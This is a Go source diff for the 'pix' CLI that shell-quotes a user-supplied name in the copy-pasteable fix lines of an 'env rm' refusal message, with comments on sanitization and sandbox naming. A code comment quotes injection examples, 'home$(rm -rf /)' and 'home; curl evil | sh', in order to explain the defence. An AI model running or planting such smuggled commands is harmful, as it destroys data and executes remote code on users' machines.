@@ -30,6 +30,7 @@ import (
 	"unicode"
 
 	"pix/host/cli"
+	"pix/host/sys"
 	"pix/host/workflow/env"
 )
 
@@ -383,9 +384,12 @@ func rmPointerName(args []string) string {
 // column alignment, ...) is DROPPED outright rather than replaced, and the
 // result is capped to rmPointerMaxNameLen runes. This only keeps the
 // OUTPUT ITSELF from being control-character- or fake-extra-line-shaped;
-// it does not and cannot stop a user from typing shell metacharacters that
-// pass through as ordinary display text — copy-pasting the fix line back
-// can never execute anything the original argv could not already do.
+// it says nothing about shell metacharacters ($(...), ;, `, |, ...) that
+// pass through unremoved — that is envRmPointerError's job (sys.ShellQuote
+// on this function's already-sanitized result), not this one's: control
+// stripping and shell quoting are two different threats (forged terminal
+// output vs. forged shell command) and stay two different, independently
+// testable steps.
 func sanitizeRmPointerName(raw string) string {
 	var b strings.Builder
 	n := 0
@@ -405,16 +409,49 @@ func sanitizeRmPointerName(raw string) string {
 // envRmPointerError is docs/design/environments.md §8.1's exact rm refusal
 // (PRD §5.5): it names the three distinct things a user might actually
 // want removed, so the wrong one is never removed by accident. name is
-// rmPointerName's already-sanitized pick — the environment forget/rm-repo
-// lines interpolate it directly; the delete-source line stays the fixed
-// `<path>` placeholder, since there is no environment root to name at all
-// here (this command never resolves one).
+// rmPointerName's already-sanitized pick (control characters already
+// dropped, length already capped) — sys.ShellQuote runs over it HERE,
+// after that sanitization, before either interpolation below: a fix line
+// is meant to be copy-pasted straight into a real shell, so untrusted argv
+// text embedded in it (a `home$(rm -rf /)` or `home; curl evil | sh`
+// typo-turned-argument) MUST tokenize as one inert literal word there, not
+// as a command substitution or a second command. sys.ShellQuote leaves an
+// already-safe token (letters, digits, and the usual name punctuation)
+// untouched, so every existing plain-name fix line prints identically to
+// before; it single-quotes anything else. Both the forget line's name and
+// the rm line's sandbox token get the SAME quoted value — quoting only the
+// interpolated tail of `pix-repo-%s` is syntactically fine (an unquoted
+// literal prefix directly abutting a quoted tail is one shell word, exactly
+// as sys.ShellSplit's own doc comment describes), and it is this pointer's
+// only structural link to `pix-repo-<name>`; see that literal's own comment
+// below for why it stays `pix-repo-`, not today's actual sandbox-naming
+// scheme. The delete-source line stays the fixed `<path>` placeholder,
+// since there is no environment root to name at all here (this command
+// never resolves one).
 func envRmPointerError(name string) string {
+	q := sys.ShellQuote(name)
 	return fmt.Sprintf("pix: `pix env rm` does not exist. Registering a name is not owning the files.\n"+
 		"     pix env forget %s   unregister the name (deletes no files)\n"+
 		"     pix rm pix-repo-%s   remove the sandbox\n"+
-		"     rm -rf <path>   delete the source yourself; pix will not\n", name, name)
+		"     rm -rf <path>   delete the source yourself; pix will not\n", q, q)
 }
+
+// The `pix-repo-` prefix above is PRD §5.5's frozen sandbox-naming
+// contract for an environment-launched sandbox, not a description of any
+// sandbox that exists today: NO env-driven launch cutover exists yet (Wave
+// D — see workflow/env/forget.go's identical "no live sandbox anywhere
+// associates itself with an environment NAME yet" note on HolderProbe),
+// so `pix rm pix-repo-work` currently names a sandbox that never gets
+// created by anything in this tree. It is NOT the same string
+// resolveSandboxName/sandbox.Name produces today for an ordinary `pix run`
+// (the generic, digest-suffixed `pix-<basename>-<8-hex digest>`, e.g.
+// `pix-work-a1b2c3d4`) — that is a DIFFERENT, pre-Wave-D naming scheme for
+// a workspace directory, answering a different question ("which directory
+// did you launch from") than this one ("which environment is this
+// sandbox's identity"). Do not "fix" pix-repo-%s here to match
+// sandbox.Name's current output: the two are deliberately decoupled until
+// Wave D wires an environment-identified sandbox naming path, and until
+// then this line is aspirational spec text, not a bug.
 
 // envRmCmd exists only to give kong a deterministic node to dispatch `pix
 // env rm ...` TO — see this struct field's own comment on envCmd. Args
